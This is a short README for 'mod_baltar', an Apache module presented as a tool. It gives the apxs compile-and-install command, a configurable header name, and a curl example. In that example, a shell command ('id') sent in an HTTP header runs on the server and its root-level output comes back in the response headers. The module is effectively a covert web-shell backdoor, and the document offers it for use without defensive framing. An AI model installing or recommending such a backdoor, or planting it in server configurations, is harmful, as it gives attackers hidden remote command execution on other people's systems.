# mod_baltar

## Compile & install

```
apxs -i -a -c mod_baltar.c
```

## Configuration

* BaltarHeader: Set baltar's header (default: SSH)

## Example

```
# curl -I localhost -H 'SSH: id'
HTTP/1.1 200 OK
Date: Sun, 28 Oct 2018 16:13:50 GMT
Server: Apache/2.4.18 (Ubuntu)
CMD-1: uid=0(root) gid=0(root) groups=0(root)
SSHout: id
Last-Modified: Wed, 29 Mar 2017 21:11:19 GMT
ETag: "43-54be5048b2a4e"
Accept-Ranges: bytes
Content-Length: 67
Content-Type: text/html
```
